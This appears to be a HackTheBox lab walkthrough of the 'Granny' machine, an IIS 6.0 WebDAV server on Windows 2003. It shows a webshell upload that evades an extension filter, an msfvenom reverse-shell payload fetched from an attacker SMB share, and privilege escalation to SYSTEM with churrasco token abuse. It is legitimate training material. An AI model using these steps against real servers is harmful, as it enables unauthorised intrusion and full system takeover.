---
render_with_liquid: false
title: HackTheBox Writeup  Granny
date: 2023-11-11 18:45:37 +1400
tags: [hackthebox, nmap, windows, windows-2003, obsolete-system, iis, webdav, davtest, cadaver, aspx, webshell, smbserver, msfvenom, privilege-token, churrasco, oscp-like]
---




# Recon
---
```bash
┌──(bravosec㉿fsociety)-[~/htb/Granny]
└─$ pt init '10.129.95.234 granny.htb'
+---------+--------+---------------+------------+
| PROFILE | STATUS |      IP       |   DOMAIN   |
+---------+--------+---------------+------------+
| granny  | on     | 10.129.95.234 | granny.htb |
+---------+--------+---------------+------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Sat Nov 11 18:45:37 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80 granny.htb
Nmap scan report for granny.htb (10.129.95.234)
Host is up, received user-set (0.070s latency).
Scanned at 2023-11-11 18:45:37 CST for 13s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sat, 11 Nov 2023 10:45:30 GMT
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Nov 11 18:45:50 2023 -- 1 IP address (1 host up) scanned in 12.49 seconds
```


## 80 - IIS Server 6.0


### Info

![](/assets/obsidian/b106505fb66af86a18d1ead3f083c040.png)

# User Flag
---


# Root Flag
---

## Enum

**IIS Version 6** is mostly linked to **Windows Server 2003**

![](/assets/obsidian/c993aed4243241fe5fbdfeb2ee6b1b7b.png)

## Shell as network service


### Webdav File Write

Nmap scan shows it's a **webdav** server, and allows HTTP methods such as `PUT` and `MOVE`

Confirmed that we can upload files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Granny]
└─$ touch test

┌──(bravosec㉿fsociety)-[~/htb/Granny]
└─$ curl http://granny.htb -T test
```

Use **davtest** to auto test **webshells**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Granny]
└─$ davtest -move -sendbd auto --url http://granny.htb
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://granny.htb
********************************************************
NOTE    Random string for this session: 1xDMnOTr
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://granny.htb/DavTestDir_1xDMnOTr
********************************************************
...
/usr/bin/davtest Summary:
Created: http://granny.htb/DavTestDir_1xDMnOTr
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.asp
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.asp;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.jhtml
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.jhtml;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.txt;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.shtml
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.shtml;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.php
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.php;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.cfm
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.cfm;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.pl
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.pl;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.aspx
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.aspx;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.jsp
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.jsp;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.html
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.html;.txt
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.cgi
MOVE/PUT File: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.cgi;.txt
Executes: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.txt
Executes: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.txt;.txt
Executes: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.html
Executes: http://granny.htb/DavTestDir_1xDMnOTr/davtest_1xDMnOTr.html;.txt
```

Although the result said `aspx` execution failed, but we can see it was actually successful

![](/assets/obsidian/566c1b9564fe9599396fb67cabb9d32d.png)

![](/assets/obsidian/dbd1c0810cd38ff14aae0e4a639ef79d.png)

### Upload webshell

> Uploading `aspx` files directly is prohibited, upload webshell in `.txt` then move it to `.aspx` to bypass
{: .prompt-tip }

Copy sample `aspx` webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Granny]
└─$ locate webshell|grep aspx
...
/usr/share/webshells/aspx
/usr/share/webshells/aspx/cmdasp.aspx

┌──(bravosec㉿fsociety)-[~/htb/Granny]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx cmd.txt
```

Upload webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Granny]
└─$ cadaver http://granny.htb/
dav:/> put cmd.txt
Uploading cmd.txt to `/cmd.txt':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
dav:/> cp cmd.txt cmd.aspx
Copying `/cmd.txt' to `/cmd.aspx':  succeeded.
dav:/>
```

Access webshell (From browser since it uses `VIEWSTATE`)

![](/assets/obsidian/9ca8287340cdf8ef130264fdc1ee8279.png)

Host reverse shell binary

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.30 LPORT=1111 -f exe -o rev.exe
smbserver.py s .
```

Send payload

```bash
\\10.10.16.30\s\rev.exe
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Granny]
└─$ rlwrap -cAr nc -nlvp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.41.168] 1033
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

## From network service to SYSTEM


### Abuse privilege tokens

```bash
c:\windows\system32\inetsrv>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                    SID
============================ ========
nt authority\network service S-1-5-20


GROUP INFORMATION
-----------------

Group Name                       Type             SID                                            Attributes
================================ ================ ============================================== ==================================================
NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
GRANNY\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

> Abuse `SeImpersonatePrivilege` token as we did in [[HackTheBox Writeup - Grandpa#Root Flag#Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation]]
{: .prompt-info }

```bash
cd $(find ~/htb/ -type d -iname Grandpa)/smb
fuser -k 445/tcp
smbserver.py s .
```

```bash
c:\windows\system32\inetsrv>\\10.10.16.30\s\churrasco.exe "cmd /c start \\10.10.16.30\s\rev.exe"
\\10.10.16.30\s\churrasco.exe "cmd /c start \\10.10.16.30\s\rev.exe"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Grandpa/exploit/iis6-exploit-2017-CVE-2017-7269]
└─$ rlwrap -cAr nc -nlvp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.95.234] 1037
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

Find flags

```bash
C:\WINDOWS\TEMP>cd "C:\Documents and Settings\"
cd "C:\Documents and Settings\"

C:\Documents and Settings>dir /b/s "*.txt"
dir /b/s "*.txt"
C:\Documents and Settings\Administrator\Cookies\administrator@microsoft[1].txt
C:\Documents and Settings\Administrator\Desktop\root.txt
...
C:\Documents and Settings\Lakis\Desktop\user.txt
C:\Documents and Settings\Lakis\Local Settings\Application Data\Microsoft\Internet Explorer\brndlog.txt
```

```bash
C:\Documents and Settings>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
aa4beed1c0584445ab463a6747bd06e9
C:\Documents and Settings>type "C:\Documents and Settings\Lakis\Desktop\user.txt"
type "C:\Documents and Settings\Lakis\Desktop\user.txt"
700c5dc163014e22b3e408f8703f67d1
```

# Additional
---

## Microsoft IIS 6.0 Remote Buffer Overflow (CVE-2017-7269)

- [[HackTheBox Writeup - Grandpa#Root Flag]]

## Metasploit

- [[HackTheBox Writeup - Grandpa#Additional#Metasploit]]